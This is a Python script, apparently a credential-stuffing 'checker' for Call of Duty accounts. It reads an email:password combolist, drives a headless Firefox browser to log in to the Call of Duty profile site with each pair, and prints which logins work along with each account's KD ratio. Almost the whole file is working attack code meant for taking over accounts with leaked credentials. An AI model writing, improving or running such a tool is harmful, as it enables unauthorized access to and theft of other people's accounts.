import requests
import re
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
import time
import json
from selenium import webdriver
from bs4 import BeautifulSoup
options = Options()
options.set_headless(headless=True)
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def login(username, password):
    driver = webdriver.Firefox(firefox_options=options)
    driver.get ("https://profile.callofduty.com/cod/login")
    driver.find_element_by_xpath("//input[@id='username']").send_keys(username)
    driver.find_element_by_xpath("//input[@id='password']").send_keys(password)
    driver.find_element_by_xpath("//button[@id='login-button']").click()
    driver.get ("https://my.callofduty.com/de/player/combatrecord")
    driver.refresh();
    elements=driver.find_elements_by_xpath("//div[@class='stats-header']/h2[@class='heading']")
    if not elements:
        NotExistent=driver.find_elements_by_xpath("//div[@class='no-gameplay-found']/h1")
        if not NotExistent:
            print bcolors.FAIL + "[X] " + username + ":" + password + " | Login wrong." + bcolors.ENDC
        #    driver.close()
        else:
            hasGames = False
            print bcolors.WARNING + "[X] " + username + ":" + password + " | Has never played before." + bcolors.ENDC
            driver.close()
    else:
        hasGames = True
        KD = driver.find_elements_by_xpath("/html[@class='wf-opensans-n3-active wf-opensans-n7-active wf-montserrat-n4-active wf-opensanscondensed-n3-active wf-opensanscondensed-n7-active wf-opensans-n4-active wf-active']/body[@class='with-sso-bar desktop sso-logged-in sso-auth-known']/div[@class='page-content-container']/div[@class='page-content parsys']/div[@class='atvi-component atvi-content-tile ignore-id template  ']/div[@id='mycod']/div[@id='app']/main[@class='main-content']/div[@class='dashboard-page-new main-content-inner inner-wrapper bo4']/section[@class='weekly-stats item']/div[@class='chart-wrap']/div[@class='weekly-stats__inner']/div[@class='StatProgressCircle bo4']/div[@class='StatProgressCircle__stats']/span[@class='value']").get_attribute('value')
        print bcolors.OKGREEN + "[O] " + username + ":" + password + " | Has a KD Ratio of " + KD + bcolors.ENDC
        element = elements[0]
        driver.close()



def storeArray(combolistin):
    with open(combolistin.replace(" ", ""), 'r') as myfile:
         for line in myfile:
              line = line.replace('\n', '')
              email = line.split(":")[0]
              password = line.split(":")[1]
              login(email, password)

def askForCombo():
    print "Please drag and drop a email:password combolist."
    combolistFullPath = raw_input("==> ")
    storeArray(combolistFullPath)

os.system("clear")
print ("welcome to the " + os.path.basename(__file__)[:-3] + " Checker!")
askForCombo()
